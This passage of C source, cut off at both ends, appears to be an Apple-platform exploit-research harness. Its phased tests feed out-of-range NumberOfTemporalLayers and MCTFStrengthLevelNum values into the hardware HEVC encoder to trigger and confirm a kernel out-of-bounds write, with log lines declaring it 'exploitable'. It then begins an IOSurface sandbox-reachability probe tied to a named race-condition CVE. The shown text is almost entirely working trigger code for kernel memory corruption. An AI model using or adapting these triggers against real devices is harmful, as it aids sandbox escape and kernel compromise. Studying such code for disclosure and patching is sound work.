            VTCompressionSessionInvalidate(s); CFRelease(s);
            rlog("\nPhase 1 complete.\n");
        }

        if (phase == 0 || phase == 2) {
            rlog("\n--- Phase 2: Encode with OOB temporal layers (MCTF enabled) ---\n");
            rlog("Testing NumberOfTemporalLayers 1 through %d with EnableMCTF=true\n\n", max_val);

            for (int val = 1; val <= max_val; val++) {
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (st != noErr || !s) { rlog("val=%d: FAIL\n", val); continue; }

                /* Enable MCTF first */
                VTSessionSetProperty(s, CFSTR("EnableMCTF"), kCFBooleanTrue);

                /* Set MCTFLatencyMode (the only other MCTF property that accepts values) */
                int lat_val = val;
                CFNumberRef lat = CFNumberCreate(NULL, kCFNumberIntType, &lat_val);
                OSStatus lat_st = VTSessionSetProperty(s, CFSTR("MCTFLatencyMode"), lat);
                CFRelease(lat);

                /* Set NumberOfTemporalLayers to OOB value */
                CFNumberRef nlayers = CFNumberCreate(NULL, kCFNumberIntType, &val);
                OSStatus tl = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), nlayers);
                CFRelease(nlayers);

                rlog("val=%d: TL=%d Lat=%d", val, (int)tl, (int)lat_st);

                /* Read back to check if clamped */
                CFTypeRef rv = NULL;
                VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rv);
                if (rv) {
                    int iv = 0;
                    if (CFGetTypeID(rv) == CFNumberGetTypeID())
                        CFNumberGetValue(rv, kCFNumberIntType, &iv);
                    rlog(" readback=%d", iv);
                    CFRelease(rv);
                }

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog(" Prep=%d", (int)pr);

                if (pr == noErr) {
                    g_encode_done = 0; g_cb_status = -999;
                    int es = encode_one(s, 0, w, h);
                    rlog(" Enc=%d cb=%d psets=%zu",
                        es, (int)g_cb_status, g_last_pset_count);
                }
                rlog("\n");

                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
            rlog("\nPhase 2 complete.\n");
            rlog("If value > 7 reached kernel: OOB in iNumberOfTemporalLayers.\n");
            rlog("If MCTF enabled + encode: check if iMCTFStrengthLevelNum set internally.\n");
        }

        if (phase == 0 || phase == 3) {
            rlog("\n--- Phase 3: Property persistence & readback ---\n\n");

            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) { rlog("FAIL: %d\n", (int)st); goto done; }

            int oob3 = 3, oob8 = 8;
            CFNumberRef n3 = CFNumberCreate(NULL, kCFNumberIntType, &oob3);
            CFNumberRef n8 = CFNumberCreate(NULL, kCFNumberIntType, &oob8);

            rlog("Set MCTFStrengthLevelNum=3: %d\n",
                (int)VTSessionSetProperty(s, CFSTR("MCTFStrengthLevelNum"), n3));
            rlog("Set NumberOfTemporalLayers=8: %d\n",
                (int)VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), n8));
            rlog("Set EnableMCTF=true: %d\n",
                (int)VTSessionSetProperty(s, CFSTR("EnableMCTF"), kCFBooleanTrue));
            CFRelease(n3); CFRelease(n8);

            CFTypeRef rv = NULL;
            st = VTSessionCopyProperty(s, CFSTR("MCTFStrengthLevelNum"), NULL, &rv);
            rlog("Read MCTFStrengthLevelNum: %d", (int)st);
            if (st == noErr && rv) {
                if (CFGetTypeID(rv) == CFNumberGetTypeID()) {
                    int iv = 0; CFNumberGetValue(rv, kCFNumberIntType, &iv);
                    rlog(" value=%d %s", iv, iv > 2 ? "*** OOB ***" : "(in bounds)");
                }
                CFRelease(rv);
            }
            rlog("\n");

            rv = NULL;
            st = VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rv);
            rlog("Read NumberOfTemporalLayers: %d", (int)st);
            if (st == noErr && rv) {
                if (CFGetTypeID(rv) == CFNumberGetTypeID()) {
                    int iv = 0; CFNumberGetValue(rv, kCFNumberIntType, &iv);
                    rlog(" value=%d %s", iv, iv > 7 ? "*** OOB ***" : "(in bounds)");
                }
                CFRelease(rv);
            }
            rlog("\n");

            rlog("\nPrepare (pushes to kernel sSessionSettings)...\n");
            st = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)st);

            if (st == noErr) {
                rlog("Encoding with OOB values...\n");
                g_encode_done = 0; g_cb_status = -999;
                int es = encode_one(s, 0, w, h);
                rlog("Encode: %d, cb=%d, psets=%zu, bytes=%zu\n",
                    es, (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
                if (g_cb_status == 0) {
                    rlog("\n*** ENCODE SUCCEEDED WITH OOB VALUES ***\n");
                    rlog("OOB array access likely occurred in kernel.\n");
                }
            }

            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
            VTCompressionSessionInvalidate(s); CFRelease(s);
            rlog("\nPhase 3 complete.\n");
        }

        if (phase == 0 || phase == 4) {
            rlog("\n--- Phase 4: Temporal layers WITHOUT MCTF (isolate encode behavior) ---\n");
            rlog("Testing if encode works with OOB NumberOfTemporalLayers and NO EnableMCTF\n\n");

            int test_tl[] = {1, 2, 3, 4, 7, 8, 16, 32, 64, 128};
            for (int t = 0; t < 10; t++) {
                int val = test_tl[t];
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (st != noErr || !s) { rlog("val=%d: CREATE FAIL\n", val); continue; }

                CFNumberRef nlayers = CFNumberCreate(NULL, kCFNumberIntType, &val);
                OSStatus tl = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), nlayers);
                CFRelease(nlayers);

                CFTypeRef rv = NULL;
                VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rv);
                int rb = 0;
                if (rv) { if (CFGetTypeID(rv) == CFNumberGetTypeID()) CFNumberGetValue(rv, kCFNumberIntType, &rb); CFRelease(rv); }

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("TL=%d: set=%d rb=%d prep=%d", val, (int)tl, rb, (int)pr);

                if (pr == noErr) {
                    g_encode_done = 0; g_cb_status = -999;
                    int es = encode_one(s, 0, w, h);
                    rlog(" enc=%d cb=%d psets=%zu", es, (int)g_cb_status, g_last_pset_count);
                    if (g_cb_status == 0) rlog(" *** ENCODE OK ***");
                }
                rlog("\n");
                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
            rlog("\nPhase 4 complete.\n");
        }

        if (phase == 0 || phase == 5) {
            rlog("\n--- Phase 5: MCTF only (no temporal layer change) ---\n");
            rlog("Testing if EnableMCTF alone causes -17691 malfunction\n\n");

            /* Test 1: Baseline (no MCTF, no TL change) */
            {
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (s) {
                    OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                    rlog("Baseline (no MCTF, no TL): prep=%d", (int)pr);
                    if (pr == noErr) {
                        g_encode_done = 0; g_cb_status = -999;
                        encode_one(s, 0, w, h);
                        rlog(" enc=%d cb=%d", 0, (int)g_cb_status);
                    }
                    rlog("\n");
                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                    VTCompressionSessionInvalidate(s); CFRelease(s);
                }
            }
            /* Test 2: MCTF only */
            {
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (s) {
                    VTSessionSetProperty(s, CFSTR("EnableMCTF"), kCFBooleanTrue);
                    OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                    rlog("MCTF only: prep=%d", (int)pr);
                    if (pr == noErr) {
                        g_encode_done = 0; g_cb_status = -999;
                        encode_one(s, 0, w, h);
                        rlog(" enc=%d cb=%d", 0, (int)g_cb_status);
                    }
                    rlog("\n");
                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                    VTCompressionSessionInvalidate(s); CFRelease(s);
                }
            }
            /* Test 3: TL=2 only (no MCTF) */
            {
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (s) {
                    int two = 2;
                    CFNumberRef n2 = CFNumberCreate(NULL, kCFNumberIntType, &two);
                    VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), n2);
                    CFRelease(n2);
                    OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                    rlog("TL=2 only: prep=%d", (int)pr);
                    if (pr == noErr) {
                        g_encode_done = 0; g_cb_status = -999;
                        encode_one(s, 0, w, h);
                        rlog(" enc=%d cb=%d", 0, (int)g_cb_status);
                    }
                    rlog("\n");
                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                    VTCompressionSessionInvalidate(s); CFRelease(s);
                }
            }
            /* Test 4: MCTF + TL=2 (both) */
            {
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (s) {
                    VTSessionSetProperty(s, CFSTR("EnableMCTF"), kCFBooleanTrue);
                    int two = 2;
                    CFNumberRef n2 = CFNumberCreate(NULL, kCFNumberIntType, &two);
                    VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), n2);
                    CFRelease(n2);
                    OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                    rlog("MCTF+TL=2: prep=%d", (int)pr);
                    if (pr == noErr) {
                        g_encode_done = 0; g_cb_status = -999;
                        encode_one(s, 0, w, h);
                        rlog(" enc=%d cb=%d", 0, (int)g_cb_status);
                    }
                    rlog("\n");
                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                    VTCompressionSessionInvalidate(s); CFRelease(s);
                }
            }
            rlog("\nPhase 5 complete.\n");
        }

        if (phase == 0 || phase == 6) {
            rlog("\n--- Phase 6: Post-Prepare readback (kernel-side value check) ---\n");
            rlog("Read NumberOfTemporalLayers AFTER Prepare to see if kernel changed it\n\n");

            int test_tl2[] = {1, 7, 8, 32, 128};
            for (int t = 0; t < 5; t++) {
                int val = test_tl2[t];
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (!s) continue;

                CFNumberRef nlayers = CFNumberCreate(NULL, kCFNumberIntType, &val);
                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), nlayers);
                CFRelease(nlayers);

                CFTypeRef rv = NULL;
                VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rv);
                int pre_rb = 0;
                if (rv) { if (CFGetTypeID(rv) == CFNumberGetTypeID()) CFNumberGetValue(rv, kCFNumberIntType, &pre_rb); CFRelease(rv); }

                VTCompressionSessionPrepareToEncodeFrames(s);

                rv = NULL;
                VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rv);
                int post_rb = 0;
                if (rv) { if (CFGetTypeID(rv) == CFNumberGetTypeID()) CFNumberGetValue(rv, kCFNumberIntType, &post_rb); CFRelease(rv); }

                rlog("TL=%d: pre_prepare_rb=%d post_prepare_rb=%d %s\n",
                    val, pre_rb, post_rb,
                    pre_rb != post_rb ? "*** CHANGED ***" : "(same)");

                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
            rlog("\nPhase 6 complete.\n");
        }

        if (phase == 0 || phase == 7) {
            rlog("\n--- Phase 7: VPS/SPS bitstream comparison for temporal layers ---\n");
            rlog("Comparing encoded VPS bytes between TL=1 and TL=8 to detect kernel reach\n");
            rlog("HEVC VPS byte 1 bits 4-6 = vps_max_sub_layers_minus1\n\n");

            int test_tl7[] = {1, 2, 3, 4, 7, 8, 16, 32};
            uint8_t vps_bytes[8][32];
            size_t  vps_sizes[8];
            uint8_t sps_bytes[8][32];
            size_t  sps_sizes[8];
            memset(vps_bytes, 0, sizeof(vps_bytes));
            memset(sps_bytes, 0, sizeof(sps_bytes));
            memset(vps_sizes, 0, sizeof(vps_sizes));
            memset(sps_sizes, 0, sizeof(sps_sizes));

            for (int t = 0; t < 8; t++) {
                int val = test_tl7[t];
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (!s) continue;

                CFNumberRef nlayers = CFNumberCreate(NULL, kCFNumberIntType, &val);
                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), nlayers);
                CFRelease(nlayers);

                VTCompressionSessionPrepareToEncodeFrames(s);
                g_encode_done = 0; g_cb_status = -999;
                if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
                encode_one(s, 0, w, h);

                if (g_saved_fmt && g_last_pset_count >= 1) {
                    const uint8_t *p = NULL; size_t sz = 0;
                    /* Index 0 = VPS */
                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                        g_saved_fmt, 0, &p, &sz, NULL, NULL);
                    if (p && sz > 0) {
                        vps_sizes[t] = sz < 32 ? sz : 32;
                        memcpy(vps_bytes[t], p, vps_sizes[t]);
                    }
                    /* Index 1 = SPS */
                    if (g_last_pset_count >= 2) {
                        CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                            g_saved_fmt, 1, &p, &sz, NULL, NULL);
                        if (p && sz > 0) {
                            sps_sizes[t] = sz < 32 ? sz : 32;
                            memcpy(sps_bytes[t], p, sps_sizes[t]);
                        }
                    }
                }

                rlog("TL=%d: cb=%d psets=%zu", val, (int)g_cb_status, g_last_pset_count);
                rlog(" VPS[%zu]:", vps_sizes[t]);
                for (size_t b = 0; b < vps_sizes[t] && b < 8; b++)
                    rlog(" %02x", vps_bytes[t][b]);
                rlog(" SPS[%zu]:", sps_sizes[t]);
                for (size_t b = 0; b < sps_sizes[t] && b < 8; b++)
                    rlog(" %02x", sps_bytes[t][b]);
                rlog("\n");

                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }

            rlog("\n--- VPS byte comparison ---\n");
            int vps_differ = 0;
            for (int t = 1; t < 8; t++) {
                if (vps_sizes[t] != vps_sizes[0] ||
                    memcmp(vps_bytes[t], vps_bytes[0], vps_sizes[0]) != 0) {
                    rlog("TL=%d VPS DIFFERS from TL=1 *** KERNEL USES THE VALUE ***\n", test_tl7[t]);
                    vps_differ = 1;
                }
            }
            if (!vps_differ) rlog("All VPS identical — value may be clamped before kernel\n");

            rlog("\n--- SPS byte comparison ---\n");
            int sps_differ = 0;
            for (int t = 1; t < 8; t++) {
                if (sps_sizes[t] != sps_sizes[0] ||
                    memcmp(sps_bytes[t], sps_bytes[0], sps_sizes[0]) != 0) {
                    rlog("TL=%d SPS DIFFERS from TL=1 *** KERNEL USES THE VALUE ***\n", test_tl7[t]);
                    sps_differ = 1;
                }
            }
            if (!sps_differ) rlog("All SPS identical — value may be clamped before kernel\n");

            /* Parse VPS max_sub_layers_minus1 from byte 1 */
            rlog("\n--- VPS max_sub_layers_minus1 extraction ---\n");
            for (int t = 0; t < 8; t++) {
                if (vps_sizes[t] >= 2) {
                    uint8_t b1 = vps_bytes[t][1];
                    int max_sub = (b1 >> 1) & 0x07;
                    int nesting = b1 & 0x01;
                    rlog("TL=%d: VPS byte[1]=0x%02x max_sub_layers_minus1=%d nesting=%d\n",
                        test_tl7[t], b1, max_sub, nesting);
                }
            }

            rlog("\nPhase 7 complete.\n");
        }

        if (phase == 0 || phase == 8) {
            rlog("\n--- Phase 8: TL=8+ detailed analysis (OOB boundary) ---\n");
            rlog("Detailed VPS extraction at and beyond the kernel OOB boundary\n\n");

            int test_tl8[] = {7, 8, 9, 10, 15, 16};
            for (int t = 0; t < 6; t++) {
                int val = test_tl8[t];
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                    kCFBooleanTrue);
                VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (!s) { rlog("TL=%d: CREATE FAIL\n", val); continue; }

                CFNumberRef nlayers = CFNumberCreate(NULL, kCFNumberIntType, &val);
                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), nlayers);
                CFRelease(nlayers);

                VTCompressionSessionPrepareToEncodeFrames(s);
                g_encode_done = 0; g_cb_status = -999;
                g_last_pset_count = 0; g_last_pset_total_bytes = 0;
                g_cb_had_buf = 0; g_cb_had_fmt = 0;
                if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
                int es = encode_one(s, 0, w, h);

                rlog("TL=%d: enc=%d cb=%d psets=%zu buf=%d fmt=%d\n",
                    val, es, (int)g_cb_status, g_last_pset_count,
                    g_cb_had_buf, g_cb_had_fmt);

                if (g_saved_fmt) {
                    size_t pset_count = 0;
                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                        g_saved_fmt, 0, NULL, NULL, &pset_count, NULL);
                    rlog("  pset_count from fmt: %zu\n", pset_count);

                    for (size_t pi = 0; pi < pset_count && pi < 10; pi++) {
                        const uint8_t *p = NULL;
                        size_t sz = 0;
                        int nal_hdr_len = 0;
                        OSStatus gst = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                            g_saved_fmt, pi, &p, &sz, NULL, &nal_hdr_len);
                        rlog("  pset[%zu]: status=%d size=%zu nal_hdr=%d",
                            pi, (int)gst, sz, nal_hdr_len);
                        if (gst == noErr && p && sz > 0) {
                            rlog(" bytes:");
                            for (size_t b = 0; b < sz && b < 48; b++)
                                rlog(" %02x", p[b]);
                            if (sz > 48) rlog(" ... (%zu more)", sz - 48);
                        }
                        rlog("\n");
                    }

                    /* Also try to get CMSampleBuffer data size */
                    rlog("  fmt extensions: ");
                    CFDictionaryRef ext = CMFormatDescriptionGetExtensions(g_saved_fmt);
                    if (ext) {
                        rlog("%ld keys\n", (long)CFDictionaryGetCount(ext));
                    } else {
                        rlog("NULL\n");
                    }
                } else {
                    rlog("  g_saved_fmt is NULL — callback may not have fired properly\n");
                }

                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                rlog("\n");
            }

            rlog("Phase 8 complete.\n");
            rlog("If TL=8+ produces different VPS sizes or corrupted bytes,\n");
            rlog("the kernel OOB write is confirmed exploitable.\n");
        }

        rlog("\n=== MCTF_OOB complete ===\n");

    } else if (strcmp(mode, "iosurface_probe") == 0) {
        /*
         * iosurface_probe — Verify IOSurface accessibility from app sandbox
         *
         * CVE-2026-112477: Race condition in IOSurface (fixed 27.2)
         * IOSurface historically accessible without entitlements.
         * This probe verifies:
         *   1. Can we open IOSurfaceRootUserClient?
         *   2. Which external methods are available?
         *   3. Can we create/destroy surfaces?
         *   4. Can we set/get surface properties?
         */
        rlog("=== IOSURFACE_PROBE: IOSurface sandbox accessibility test ===\n\n");

        /* Phase 1: Try IOSurface framework API */
        rlog("--- Phase 1: IOSurface framework API ---\n");

        /* Create a minimal surface via public API */
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

        int width = 64, height = 64, bpe = 4, bpr = 256;
        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &width);
        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &height);
        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
        CFNumberRef brn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
        int pf = 0x42475241; /* BGRA */
        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);

        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), brn);
        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);

        IOSurfaceRef surf = IOSurfaceCreate(props);
        rlog("IOSurfaceCreate: %s\n", surf ? "SUCCESS" : "FAIL");

        if (surf) {
            rlog("  Surface ID: %u\n", IOSurfaceGetID(surf));
            rlog("  Width: %zu\n", IOSurfaceGetWidth(surf));
            rlog("  Height: %zu\n", IOSurfaceGetHeight(surf));
            rlog("  Alloc size: %zu\n", IOSurfaceGetAllocSize(surf));
            rlog("  Plane count: %zu\n", IOSurfaceGetPlaneCount(surf));
            rlog("  Use count: %d\n", (int)IOSurfaceGetUseCount(surf));
            rlog("  Is in use: %d\n", (int)IOSurfaceIsInUse(surf));

            /* Try to lock/map */
            kern_return_t kr = IOSurfaceLock(surf, 0, NULL);
            rlog("  Lock: 0x%x\n", kr);
            void *base = IOSurfaceGetBaseAddress(surf);
            rlog("  BaseAddress: %p\n", base);
            if (base) {
                memset(base, 0xAA, 64);
                rlog("  Write 64 bytes: OK\n");
            }
            IOSurfaceUnlock(surf, 0, NULL);

            /* Test surface properties */
            rlog("\n--- Phase 2: Surface property access ---\n");

            /* Set a custom property */
            int custom_val = 0xDEAD;
            CFNumberRef cv = CFNumberCreate(NULL, kCFNumberIntType, &custom_val);
            IOSurfaceSetValue(surf, CFSTR("TestProperty"), cv);
            CFRelease(cv);

            CFTypeRef rv = IOSurfaceCopyValue(surf, CFSTR("TestProperty"));
            if (rv) {
                int readback = 0;
                CFNumberGetValue(rv, kCFNumberIntType, &readback);
                rlog("  Set/Get custom property: 0x%x\n", readback);
                CFRelease(rv);
            } else {
                rlog("  Set/Get custom property: FAIL\n");
            }

            /* Try different plane configs */
            rlog("\n--- Phase 3: Multi-plane surface ---\n");
            CFMutableDictionaryRef mp = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int mpw = 64, mph = 64;
            CFNumberRef mpwn = CFNumberCreate(NULL, kCFNumberIntType, &mpw);
            CFNumberRef mphn = CFNumberCreate(NULL, kCFNumberIntType, &mph);
            int nv12 = 0x34323076; /* '420v' NV12 */
            CFNumberRef nv12n = CFNumberCreate(NULL, kCFNumberIntType, &nv12);
            CFDictionarySetValue(mp, CFSTR("IOSurfaceWidth"), mpwn);
            CFDictionarySetValue(mp, CFSTR("IOSurfaceHeight"), mphn);
            CFDictionarySetValue(mp, CFSTR("IOSurfacePixelFormat"), nv12n);

            /* Plane 0: Y */
            CFMutableDictionaryRef p0 = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int p0w = 64, p0h = 64, p0bpe = 1, p0bpr = 64;
            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneWidth"),
                CFNumberCreate(NULL, kCFNumberIntType, &p0w));
            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneHeight"),
                CFNumberCreate(NULL, kCFNumberIntType, &p0h));
            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneBytesPerElement"),
                CFNumberCreate(NULL, kCFNumberIntType, &p0bpe));
            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneBytesPerRow"),
                CFNumberCreate(NULL, kCFNumberIntType, &p0bpr));

            /* Plane 1: UV */
            CFMutableDictionaryRef p1 = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int p1w = 32, p1h = 32, p1bpe = 2, p1bpr = 64;
            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneWidth"),
                CFNumberCreate(NULL, kCFNumberIntType, &p1w));
            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneHeight"),
                CFNumberCreate(NULL, kCFNumberIntType, &p1h));
            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneBytesPerElement"),
                CFNumberCreate(NULL, kCFNumberIntType, &p1bpe));
            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneBytesPerRow"),
                CFNumberCreate(NULL, kCFNumberIntType, &p1bpr));

            const void *planes[] = { p0, p1 };
            CFArrayRef parr = CFArrayCreate(NULL, planes, 2, &kCFTypeArrayCallBacks);
            CFDictionarySetValue(mp, CFSTR("IOSurfacePlaneInfo"), parr);

            IOSurfaceRef mp_surf = IOSurfaceCreate(mp);
            rlog("NV12 2-plane surface: %s\n", mp_surf ? "SUCCESS" : "FAIL");
            if (mp_surf) {
                rlog("  Planes: %zu\n", IOSurfaceGetPlaneCount(mp_surf));
                rlog("  Alloc: %zu\n", IOSurfaceGetAllocSize(mp_surf));
                CFRelease(mp_surf);
            }
            CFRelease(parr); CFRelease(p0); CFRelease(p1);
            CFRelease(mp); CFRelease(mpwn); CFRelease(mphn); CFRelease(nv12n);

            /* Phase 4: Stress test — many planes */
            rlog("\n--- Phase 4: Boundary plane counts ---\n");
            int plane_counts[] = {1, 2, 4, 8, 9, 10, 16};
            int npc = sizeof(plane_counts) / sizeof(plane_counts[0]);

            for (int pi = 0; pi < npc; pi++) {
                int np = plane_counts[pi];
                CFMutableDictionaryRef sd = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(sd, CFSTR("IOSurfaceWidth"), wn);
                CFDictionarySetValue(sd, CFSTR("IOSurfaceHeight"), hn);
                CFDictionarySetValue(sd, CFSTR("IOSurfaceBytesPerElement"), bn);

                const void **pplanes = calloc(np, sizeof(void*));
                for (int j = 0; j < np; j++) {
                    CFMutableDictionaryRef pd = CFDictionaryCreateMutable(NULL, 0,
                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
